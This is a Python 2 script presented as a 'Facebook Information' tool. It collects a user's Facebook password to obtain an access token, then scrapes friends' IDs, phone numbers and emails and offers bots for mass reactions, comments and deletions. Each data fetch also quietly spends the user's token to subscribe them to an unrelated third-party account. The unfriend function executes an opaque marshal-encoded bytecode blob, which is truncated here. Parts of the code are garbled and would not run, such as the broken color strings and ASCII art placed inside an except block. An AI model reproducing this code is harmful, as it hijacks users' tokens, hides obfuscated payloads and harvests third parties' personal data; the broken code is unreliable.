###################################################################
#                        Import Module
import json , sys , hashlib , os , time , marshal , getpass
###################################################################
'''
     Facebook Information 
'''
###################################################################
#                             COLOR
if sys.platform in ["linux","linux2"]:
	RED = 1033[1;91m'
    WHITE = '1033[1;97m'
    GREEN = 1033[1;32m' #
     YELLOW = "1033[1;33m'
     BLUE 1033[1:34m'
     ORANGE = '\033[1:35m'   
else:
	R = ''
	W = ''
	Y = ''
	B = "
	O = "
###################################################################
#                      Exception
try:
	import requests
except ImportError:                                                                                                                                                                                                                                                                                                                                                                                                           
                                    dddddddd                                                                                                                                                                             dddddddd                                                                                                                                                                               
IIIIIIIIII                            d::::::d  iiii                                          hhhhhhh                                                  kkkkkkkk                                                            d::::::d                                                                                                                              iiii          tttt                               
I::::::::I                            d::::::d i::::i                                         h:::::h                                                  k::::::k                                                            d::::::d                                                                                                                             i::::i      ttt:::t                               
I::::::::I                            d::::::d  iiii                                          h:::::h                                                  k::::::k                                                            d::::::d                                                                                                                              iiii       t:::::t                               
II::::::II                            d:::::d                                                 h:::::h                                                  k::::::k                                                            d:::::d                                                                                                                                          t:::::t                               
  I::::Innnn  nnnnnnnn        ddddddddd:::::d iiiiiii   aaaaaaaaaaaaa  nnnn  nnnnnnnn          h::::h hhhhh         aaaaaaaaaaaaa      cccccccccccccccc k:::::k    kkkkkkk eeeeeeeeeeee    rrrrr   rrrrrrrrr       ddddddddd:::::d          cccccccccccccccc   ooooooooooo      mmmmmmm    mmmmmmm      mmmmmmm    mmmmmmm   uuuuuu    uuuuuunnnn  nnnnnnnn    iiiiiiittttttt:::::tttttttyyyyyyy           yyyyyyy
  I::::In:::nn::::::::nn    dd::::::::::::::d i:::::i   a::::::::::::a n:::nn::::::::nn        h::::hh:::::hhh      a::::::::::::a   cc:::::::::::::::c k:::::k   k:::::kee::::::::::::ee  r::::rrr:::::::::r    dd::::::::::::::d        cc:::::::::::::::c oo:::::::::::oo  mm:::::::m  m:::::::mm  mm:::::::m  m:::::::mm u::::u    u::::un:::nn::::::::nn  i:::::it:::::::::::::::::t y:::::y         y:::::y 
  I::::In::::::::::::::nn  d::::::::::::::::d  i::::i   aaaaaaaaa:::::an::::::::::::::nn       h::::::::::::::hh    aaaaaaaaa:::::a c:::::::::::::::::c k:::::k  k:::::ke::::::eeeee:::::eer:::::::::::::::::r  d::::::::::::::::d       c:::::::::::::::::co:::::::::::::::om::::::::::mm::::::::::mm::::::::::mm::::::::::mu::::u    u::::un::::::::::::::nn  i::::it:::::::::::::::::t  y:::::y       y:::::y  
  I::::Inn:::::::::::::::nd:::::::ddddd:::::d  i::::i            a::::ann:::::::::::::::n      h:::::::hhh::::::h            a::::ac:::::::cccccc:::::c k:::::k k:::::ke::::::e     e:::::err::::::rrrrr::::::rd:::::::ddddd:::::d      c:::::::cccccc:::::co:::::ooooo:::::om::::::::::::::::::::::mm::::::::::::::::::::::mu::::u    u::::unn:::::::::::::::n i::::itttttt:::::::tttttt   y:::::y     y:::::y   
  I::::I  n:::::nnnn:::::nd::::::d    d:::::d  i::::i     aaaaaaa:::::a  n:::::nnnn:::::n      h::::::h   h::::::h    aaaaaaa:::::ac::::::c     ccccccc k::::::k:::::k e:::::::eeeee::::::e r:::::r     r:::::rd::::::d    d:::::d      c::::::c     ccccccco::::o     o::::om:::::mmm::::::mmm:::::mm:::::mmm::::::mmm:::::mu::::u    u::::u  n:::::nnnn:::::n i::::i      t:::::t          y:::::y   y:::::y    
  I::::I  n::::n    n::::nd:::::d     d:::::d  i::::i   aa::::::::::::a  n::::n    n::::n      h:::::h     h:::::h  aa::::::::::::ac:::::c              k:::::::::::k  e:::::::::::::::::e  r:::::r     rrrrrrrd:::::d     d:::::d      c:::::c             o::::o     o::::om::::m   m::::m   m::::mm::::m   m::::m   m::::mu::::u    u::::u  n::::n    n::::n i::::i      t:::::t           y:::::y y:::::y     
  I::::I  n::::n    n::::nd:::::d     d:::::d  i::::i  a::::aaaa::::::a  n::::n    n::::n      h:::::h     h:::::h a::::aaaa::::::ac:::::c              k:::::::::::k  e::::::eeeeeeeeeee   r:::::r            d:::::d     d:::::d      c:::::c             o::::o     o::::om::::m   m::::m   m::::mm::::m   m::::m   m::::mu::::u    u::::u  n::::n    n::::n i::::i      t:::::t            y:::::y:::::y      
  I::::I  n::::n    n::::nd:::::d     d:::::d  i::::i a::::a    a:::::a  n::::n    n::::n      h:::::h     h:::::ha::::a    a:::::ac::::::c     ccccccc k::::::k:::::k e:::::::e            r:::::r            d:::::d     d:::::d      c::::::c     ccccccco::::o     o::::om::::m   m::::m   m::::mm::::m   m::::m   m::::mu:::::uuuu:::::u  n::::n    n::::n i::::i      t:::::t    tttttt   y:::::::::y       
II::::::IIn::::n    n::::nd::::::ddddd::::::ddi::::::ia::::a    a:::::a  n::::n    n::::n      h:::::h     h:::::ha::::a    a:::::ac:::::::cccccc:::::ck::::::k k:::::ke::::::::e           r:::::r            d::::::ddddd::::::dd     c:::::::cccccc:::::co:::::ooooo:::::om::::m   m::::m   m::::mm::::m   m::::m   m::::mu:::::::::::::::uun::::n    n::::ni::::::i     t::::::tttt:::::t    y:::::::y        
I::::::::In::::n    n::::n d:::::::::::::::::di::::::ia:::::aaaa::::::a  n::::n    n::::n      h:::::h     h:::::ha:::::aaaa::::::a c:::::::::::::::::ck::::::k  k:::::ke::::::::eeeeeeee   r:::::r             d:::::::::::::::::d      c:::::::::::::::::co:::::::::::::::om::::m   m::::m   m::::mm::::m   m::::m   m::::m u:::::::::::::::un::::n    n::::ni::::::i     tt::::::::::::::t     y:::::y         
I::::::::In::::n    n::::n  d:::::::::ddd::::di::::::i a::::::::::aa:::a n::::n    n::::n      h:::::h     h:::::h a::::::::::aa:::a cc:::::::::::::::ck::::::k   k:::::kee:::::::::::::e   r:::::r              d:::::::::ddd::::d       cc:::::::::::::::c oo:::::::::::oo m::::m   m::::m   m::::mm::::m   m::::m   m::::m  uu::::::::uu:::un::::n    n::::ni::::::i       tt:::::::::::tt    y:::::y          
IIIIIIIIIInnnnnn    nnnnnn   ddddddddd   dddddiiiiiiii  aaaaaaaaaa  aaaa nnnnnn    nnnnnn      hhhhhhh     hhhhhhh  aaaaaaaaaa  aaaa   cccccccccccccccckkkkkkkk    kkkkkkk eeeeeeeeeeeeee   rrrrrrr               ddddddddd   ddddd         cccccccccccccccc   ooooooooooo   mmmmmm   mmmmmm   mmmmmmmmmmmm   mmmmmm   mmmmmm    uuuuuuuu  uuuunnnnnn    nnnnnniiiiiiii         ttttttttttt     y:::::y           
                                                                                                                                                                                                                                                                                                                                                                                               y:::::y                                                                                                                                                                                                                                                                                                                                                                                                       y:::::y                                                                                                                                                                                                                                                                                                                                                                                                        y:::::y                                                                                                                                                                                                                                                                                                                                                                                                        y:::::y                                                                                                                                                                                                                                                                                                                                                                                                        yyyyyyy                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
DDDDDDDDDDDDD                                                                                                     AAA   VVVVVVVV           VVVVVVVV      GGGGGGGGGGGGG                        RRRRRRRRRRRRRRRRR        OOOOOOOOO             CCCCCCCCCCCCCKKKKKKKKK    KKKKKKK        66666666  999999999                                                                                                         
D::::::::::::DDD                                                                 >>>>>>>                         A:::A  V::::::V           V::::::V   GGG::::::::::::G                        R::::::::::::::::R     OO:::::::::OO        CCC::::::::::::CK:::::::K    K:::::K       6::::::6 99:::::::::99                                                                                                       
D:::::::::::::::DD                                                                >:::::>                       A:::::A V::::::V           V::::::V GG:::::::::::::::G                        R::::::RRRRRR:::::R  OO:::::::::::::OO    CC:::::::::::::::CK:::::::K    K:::::K      6::::::699:::::::::::::99                                                                                                     
DDD:::::DDDDD:::::D                                                                >:::::>                     A:::::::AV::::::V           V::::::VG:::::GGGGGGGG::::G                        RR:::::R     R:::::RO:::::::OOO:::::::O  C:::::CCCCCCCC::::CK:::::::K   K::::::K     6::::::69::::::99999::::::9                                                                                                    
  D:::::D    D:::::D     eeeeeeeeeeee  vvvvvvv           vvvvvvv ===============    >:::::>                   A:::::::::AV:::::V           V:::::VG:::::G       GGGGGG                          R::::R     R:::::RO::::::O   O::::::O C:::::C       CCCCCCKK::::::K  K:::::KKK    6::::::6 9:::::9     9:::::9                                                                                                    
  D:::::D     D:::::D  ee::::::::::::ee v:::::v         v:::::v  =:::::::::::::=     >:::::>                 A:::::A:::::AV:::::V         V:::::VG:::::G                                        R::::R     R:::::RO:::::O     O:::::OC:::::C                K:::::K K:::::K      6::::::6  9:::::9     9:::::9                                                                                                    
  D:::::D     D:::::D e::::::eeeee:::::eev:::::v       v:::::v   ===============      >:::::>               A:::::A A:::::AV:::::V       V:::::V G:::::G                                        R::::RRRRRR:::::R O:::::O     O:::::OC:::::C                K::::::K:::::K      6::::::6    9:::::99999::::::9                                                                                                    
  D:::::D     D:::::De::::::e     e:::::e v:::::v     v:::::v                          >:::::>             A:::::A   A:::::AV:::::V     V:::::V  G:::::G    GGGGGGGGGG                          R:::::::::::::RR  O:::::O     O:::::OC:::::C                K:::::::::::K      6::::::::6666699::::::::::::::9                                                                                                    
  D:::::D     D:::::De:::::::eeeee::::::e  v:::::v   v:::::v     ===============      >:::::>             A:::::A     A:::::AV:::::V   V:::::V   G:::::G    G::::::::G                          R::::RRRRRR:::::R O:::::O     O:::::OC:::::C                K:::::::::::K     6::::::::::::::6699999::::::::9                                                                                                     
  D:::::D     D:::::De:::::::::::::::::e    v:::::v v:::::v      =:::::::::::::=     >:::::>             A:::::AAAAAAAAA:::::AV:::::V V:::::V    G:::::G    GGGGG::::G                          R::::R     R:::::RO:::::O     O:::::OC:::::C                K::::::K:::::K    6::::::66666:::::6    9::::::9                                                                                                      
  D:::::D     D:::::De::::::eeeeeeeeeee      v:::::v:::::v       ===============    >:::::>             A:::::::::::::::::::::AV:::::V:::::V     G:::::G        G::::G                          R::::R     R:::::RO:::::O     O:::::OC:::::C                K:::::K K:::::K   6:::::6     6:::::6  9::::::9                                                                                                       
  D:::::D    D:::::D e:::::::e                v:::::::::v                          >:::::>             A:::::AAAAAAAAAAAAA:::::AV:::::::::V       G:::::G       G::::G                          R::::R     R:::::RO::::::O   O::::::O C:::::C       CCCCCCKK::::::K  K:::::KKK6:::::6     6:::::6 9::::::9                                                                                                        
DDD:::::DDDDD:::::D  e::::::::e                v:::::::v                          >:::::>             A:::::A             A:::::AV:::::::V         G:::::GGGGGGGG::::G                        RR:::::R     R:::::RO:::::::OOO:::::::O  C:::::CCCCCCCC::::CK:::::::K   K::::::K6::::::66666::::::69::::::9                                                                                                         
D:::::::::::::::DD    e::::::::eeeeeeee         v:::::v                          >>>>>>>             A:::::A               A:::::AV:::::V           GG:::::::::::::::G                        R::::::R     R:::::R OO:::::::::::::OO    CC:::::::::::::::CK:::::::K    K:::::K 66:::::::::::::669::::::9                                                                                                          
D::::::::::::DDD       ee:::::::::::::e          v:::v                                              A:::::A                 A:::::AV:::V              GGG::::::GGG:::G                        R::::::R     R:::::R   OO:::::::::OO        CCC::::::::::::CK:::::::K    K:::::K   66:::::::::66 9::::::9                                                                                                           
DDDDDDDDDDDDD            eeeeeeeeeeeeee           vvv                                              AAAAAAA                   AAAAAAAVVV                  GGGGGG   GGGG                        RRRRRRRR     RRRRRRR     OOOOOOOOO             CCCCCCCCCCCCCKKKKKKKKK    KKKKKKK     666666666  99999999                                                                                                                                                                                                                                                                              ________________________                                                                                                                                                                                                                                                                                                                                                                                      _::::::::::::::::::::::_                                                                                                                                                                                                                                                                                                                                                                                         ________________________                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
	sys.exit()
####################################################################
#                    Set Default encoding
reload (sys)
sys . setdefaultencoding ( 'utf8' )
####################################################################
#       	        I don't know
jml = []
jmlgetdata = []
n = []
####################################################################
#                        BANNER
def baliho():
	try:
		token = open('cookie/token.log','r').read()
		r = requests.get('https://graph.facebook.com/me?access_token=' + token)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])


	except (KeyError,IOError):
	 
		print ' ' + W
		print ('F B I').center(44)
		print (W + '     [' + G +'Facebook Information'+ W + ']')
		print ' '
####################################################################
#		    Print In terminal
def show_program():

	print '''
                    %sINFORMATION%s
 ------------------------------------------------------
    Forker     indian hacker community
    Author     avy_rock69
    Name       Facebook Information
    Version    Full Version
    Date       13/08/2018 
    Jabber     @avg_rock69
* if you find any errors or problems , please contact
  author
'''%(G,W)
def info_ga():

	print '''
     %sCOMMAND                      DESCRIPTION%s
  -------------       -------------------------------------

   get_data           fetching all friends data
   get_info           show information about your friend

   dump_id            fetching all id from friend list
   dump_phone         fetching all phone number from friend list
   dump_mail          fetching all emails from friend list
   dump_<id>_id       fetching all id from your friends <spesific>
		      ex: dump_username_id

   token              Generate access token
   cat_token          show your access token
   rm_token           remove access token

   bot                open bot menu

   clear              clear terminal
   help               show help
   about              Show information about this program
   exit               Exit the program
'''%(G,W)
def menu_bot():
	print '''
   %sNumber                  INFO%s
 ---------   ------------------------------------

   [ 01 ]      auto reactions
   [ 02 ]      auto comment
   [ 03 ]      auto poke
   [ 04 ]      accept all friend requests
   [ 05 ]      delete all posts in your timeline
   [ 06 ]      delete all friends
   [ 07 ]      stop following all friends
   [ 08 ]      delete all photo albums

   [ 00 ]      back to main menu
'''%(G,W)
def menu_reaction():
	print '''
   %sNumber                  INFO%s
 ----------   ------------------------------------

   [ 01 ]      like
   [ 02 ]      reaction 'LOVE'
   [ 03 ]      reaction 'WOW'
   [ 04 ]      reaction 'HAHA'
   [ 05 ]      reaction 'SAD'
   [ 06 ]      reaction 'ANGRY'

   [ 00 ]      back to menu bot
'''%(G,W)
####################################################################
#                     GENERATE ACCESS TOKEN
def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		exit()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		main()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		main()
def id():
	print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
        x.update(sig)

	data.update({'sig':x.hexdigest()})
        get(data)
####################################################################
#       	            BOT
	                # Execute #
def post():
	global token , WT

	try:
	  if WT == 'wallpost':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['home']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['home']['data']

	  elif WT == 'me':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['feed']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['feed']['data']

	  elif WT == 'req':
		print '[*] fetching all friends requests'

		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['from']['id']),;sys.stdout.flush();time.sleep(0.01)
		return result['data']

	  elif WT == 'friends':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['friends']['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
		return result['friends']['data']

	  elif WT == 'subs':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
		return result

	  elif WT == 'albums':
		print '[*] fetching all albums id'

		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['albums']['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
		return result['albums']['data']

	  else:
		print '[*] fetching all posts id'

		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['feed']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['feed']['data']

	except KeyError:
		print '[!] failed to retrieve all post id'
		print '[!] Stopped'
		bot()
	except requests.exceptions.ConnectionError:
		print '[!] Connection Error'
		print '[!] Stopped'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped                                      '
		bot()
def like(posts , amount):
	global type , token , WT

	print '\r[*] All posts id successfuly retrieved            '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:

			if counter >= amount:
				break
			else:
				counter += 1

			parameters = {'access_token' : token , 'type' : type}
			url = "https://graph.facebook.com/{0}/reactions".format(post['id'])
			s = requests.post(url, data = parameters)

			id = post['id'].split('_')[0]

			try:
				print '\r' + W + '[' + G + id + W + '] ' + post['message'][:40].replace('\n',' ') + '...'
			except KeyError:
				try:
					print '\r' + W + '[' + G + id + W + '] ' + post['story'].replace('\n',' ')
				except KeyError:
					print '\r' + W + '[' + G + id + W + '] Successfully liked'

		print '\r[*] Done                   '
		menu_reaction_ask()
	except KeyboardInterrupt:
		print '\r[!] Stopped                     '
		menu_reaction_ask()
def comment(posts , amount):
	global message , token

	print '\r[*] All posts id successfuly retrieved          '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= amount:
				break
			else:
				counter += 1

			parameters = {'access_token' : token, 'message' : message}
			url = "https://graph.facebook.com/{0}/comments".format(post['id'])
			s = requests.post(url, data = parameters)

			id = post['id'].split('_')[0]

			try:
				print W + '[' + G + id + W + '] ' +post['message'][:40].replace('\n',' ') + '...'
			except KeyError:
				try:
					print W + '[' + G + id + W + '] ' + post['story'].replace('\n',' ')
				except KeyError:
					print W + '[' + G + id + W + '] successfully commented'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
                print '\r[!] Stopped'
		bot()
def remove(posts):
	global token , WT

	print '\r[*] All post id successfully retrieved          '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break

			r = requests.post('https://graph.facebook.com/{id}?method=delete&access_token={token}'.format(id=post['id'],token=token))
			a = json.loads(r.text)

			try:
				cek = a['error']['message']
				print W + '[' + R + post['id'] + W +'] Failed'
			except TypeError:
				print W + '[' + G + post['id'] + W + '] Removed'
				counter += 1
		print '[*] done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		bot()
def confirm(posts):
	global token , WT

	print '\r[*] All friend requests successfully retrieved        '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(post['from']['id'] , token))
			a = json.loads(r.text)

			try:
				cek = a['error']['message']
				print W + '[' + R + post['from']['name'] + W + '] Failed'
			except TypeError:
				print W + '[' + G + post['from']['name'] + W + '] Confirmed'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		bot()
def unfriend(posts):


	exec marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\xf5\x12\x00\x00@\x00\x00\x00s\x89<\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00d\x03\x00d\x04\x00d\x05\x00d\x06\x00d\x07\x00d\x08\x00d\t\x00d\n\x00d\x0b\x00d\x0c\x00d\r\x00d\x0e\x00d\x0f\x00d\x10\x00d\x11\x00d\x12\x00d\x13\x00d\x14\x00d\x15\x00d\x16\x00d\x17\x00d\x18\x00d\x19\x00d\x1a\x00d\x1b\x00d\x1c\x00d\x1d\x00d\x1e\x00d\x1f\x00d \x00d!\x00d"\x00d#\x00d$\x00d%\x00d&\x00d\x18\x00d\'\x00d(\x00d)\x00d*\x00d\t\x00d+\x00d \x00d,\x00d\x0c\x00d-\x00d.\x00d/\x00d0\x00d \x00d1\x00d\x06\x00d2\x00d3\x00d4\x00d5\x00d6\x00d*\x00d7\x00d8\x00d9\x00d8\x00d:\x00d;\x00d<\x00d=\x00d-\x00d>\x00d?\x00d@\x00dA\x00d\x1a\x00dB\x00dC\x00dD\x00dE\x00d\x1b\x00d?\x00dF\x00dG\x00d$\x00dH\x00dI\x00dJ\x00dK\x00d\x10\x00d\x02\x00dL\x00dM\x00dN\x00dO\x00dP\x00dQ\x00dR\x00dS\x00dT\x00dU\x00dV\x00dW\x00d=\x00dX\x00d\x17\x00dY\x00dZ\x00d[\x00d\\\x00d+\x00d\x1c\x00d]\x00dU\x00d?\x00d^\x00d\\\x00d_\x00dO\x00d`\x00d\t\x00d\x0c\x00da\x00db\x00d\x06\x00dc\x00d9\x00dd\x00de\x00df\x00dg\x00d@\x00dh\x00di\x00d!\x00dj\x00dk\x00d\x19\x00d\x1b\x00dl\x00dm\x00d[\x00d9\x00dn\x00do\x00dH\x00d0\x00dp\x00d\x1e\x00dq\x00dr\x00ds\x00dn\x00d:\x00dB\x00d\x19\x00dt\x00d0\x00du\x00d\x19\x00d\x1f\x00dv\x00d0\x00d\x04\x00d\x1c\x00ds\x00dM\x00dZ\x00dw\x00d5\x00dx\x00dy\x00d\x0b\x00dz\x00d{\x00d|\x00d\x02\x00d}\x00d~\x00d\x7f\x00dI\x00d\x80\x00d\x81\x00dn\x00d\x82\x00d\\\x00d\x83\x00d\x84\x00dZ\x00d\x85\x00d\x86\x00d\x84\x00d\x87\x00d\x1c\x00d\x88\x00d\x89\x00d\x8a\x00d\x8b\x00d\x8c\x00d\x8d\x00d\x8e\x00d\x8f\x00d\x90\x00d\x91\x00d\x92\x00d\x93\x00d>\x00dp\x00d\x1a\x00dA\x00d\x94\x00d\x95\x00d<\x00d\x96\x00d\x19\x00d$\x00d\x1c\x00d\x1d\x00d\x97\x00d\x98\x00d\x99\x00dQ\x00d\x9a\x00dV\x00dA\x00dq\x00d\x97\x00d9\x00dV\x00dc\x00d\x9b\x00d\x9c\x00d\x9d\x00d\x9b\x00d\x9e\x00d\x9f\x00d\xa0\x00d\xa1\x00dA\x00dA\x00dH\x00d\xa2\x00d\xa3\x00d\x9e\x00d\xa4\x00d\xa5\x00d\x9d\x00d\xa6\x00d\xa7\x00d\x95\x00dr\x00d\xa5\x00d\'\x00d\xa8\x00dl\x00d\x18\x00d8\x00d\xa9\x00d\x8b\x00d~\x00d\x05\x00di\x00d[\x00d\x08\x00d\xaa\x00d\xab\x00d\xac\x00dV\x00d\xad\x00d\x0e\x00d\xae\x00dH\x00d\x11\x00d\xaf\x00d\xa9\x00d\xb0\x00d\x13\x00d/\x00d\x17\x00d\x18\x00d\xb1\x00d\x1a\x00d\x1b\x00d\xa6\x00d\x1d\x00d6\x00d\xac\x00d \x00d&\x00d\x1a\x00d#\x00d$\x00d\x9a\x00d&\x00d\x18\x00d\xb2\x00d(\x00d)\x00d\xb3\x00d\t\x00d+\x00d\xb4\x00d,\x00d\x0c\x00d\xb5\x00d.\x00d/\x00d\xb6\x00d \x00d1\x00d\xb7\x00d2\x00d3\x00d\xad\x00d5\x00d6\x00dj\x00d7\x00d8\x00d4\x00d8\x00d:\x00dD\x00d<\x00d=\x00d{\x00d>\x00d?\x00d\x99\x00dA\x00d\x1a\x00d~\x00dC\x00dD\x00d\x95\x00d\x1b\x00d?\x00d\xb8\x00dG\x00d$\x00d~\x00dI\x00dJ\x00d\xb9\x00d\x10\x00d\x02\x00dc\x00dM\x00dN\x00d\x1c\x00dP\x00dQ\x00dZ\x00dS\x00dT\x00d\xba\x00dV\x00dW\x00d\xbb\x00dX\x00d\x17\x00df\x00dZ\x00d[\x00d)\x00d+\x00d\x1c\x00d\x81\x00dU\x00d?\x00d\xb6\x00d\\\x00d_\x00dh\x00d`\x00d\t\x00d\xbc\x00da\x00db\x00d6\x00dc\x00d9\x00dR\x00de\x00df\x00d\xbd\x00d@\x00dh\x00d\x8a\x00d!\x00dj\x00d9\x00d\x19\x00d\x1b\x00d\xbe\x00dm\x00d[\x00d\xbf\x00dn\x00do\x00d\xc0\x00d0\x00dp\x00d\x98\x00dq\x00dr\x00dk\x00dn\x00d:\x00d{\x00d\x19\x00dt\x00d\x91\x00du\x00d\x19\x00d\xa3\x00dv\x00d0\x00d\x0f\x00d\x1c\x00ds\x00de\x00dZ\x00dw\x00d\xaa\x00dx\x00dy\x00de\x00dz\x00d{\x00d2\x00d\x02\x00d}\x00d\xc1\x00d\x7f\x00dI\x00d}\x00d\x81\x00dn\x00d\x8b\x00d\\\x00d\x83\x00d\x89\x00dZ\x00d\x85\x00dE\x00d\x84\x00d\x87\x00d\x05\x00d\x88\x00d\x89\x00d\xb7\x00d\x8b\x00d\x8c\x00d8\x00d\x8e\x00d\x8f\x00d{\x00d\x91\x00d\x92\x00d\xc2\x00d>\x00dp\x00d\xa7\x00dA\x00d\x94\x00d\x7f\x00d<\x00d\x96\x00d\xc3\x00d$\x00d\x1c\x00dG\x00d\x97\x00d\x98\x00d\xa4\x00dQ\x00d\x9a\x00d\xad\x00dA\x00dq\x00d\x04\x00d9\x00dV\x00d\xa6\x00d\x9b\x00d\x9c\x00dI\x00d\x9b\x00d\x9e\x00d\xc4\x00d\xa0\x00d\xa1\x00d\xb8\x00dA\x00dH\x00d\xc5\x00d\xa3\x00d\x9e\x00d/\x00d\xa5\x00d\x9d\x00d\x1d\x00d\xa7\x00d\x95\x00dc\x00d\xa5\x00d\'\x00d\xc6\x00dl\x00d\x18\x00d\xc7\x00d\xa9\x00d\x8b\x00d\xaa\x00d\x05\x00di\x00d\x14\x00d\x08\x00d\xaa\x00d\x1d\x00d\xac\x00dV\x00d(\x00d\x0e\x00d\xae\x00d\xa5\x00d\x11\x00d\xaf\x00d\xb4\x00d\xb0\x00d\x13\x00d0\x00d\x17\x00d\x18\x00d`\x00d\x1a\x00d\x1b\x00dA\x00d\x1d\x00d6\x00d>\x00d \x00d&\x00dl\x00d#\x00d$\x00dn\x00d&\x00d\x18\x00d\xb7\x00d(\x00d)\x00d\x12\x00d\t\x00d+\x00dt\x00d,\x00d\x0c\x00d6\x00d.\x00d/\x00d\xc0\x00d \x00d1\x00d\'\x00d2\x00d3\x00d\x8e\x00d5\x00d6\x00dE\x00d7\x00d8\x00d\xc8\x00d8\x00d:\x00d\xc9\x00d<\x00d=\x00d-\x00d>\x00d?\x00d 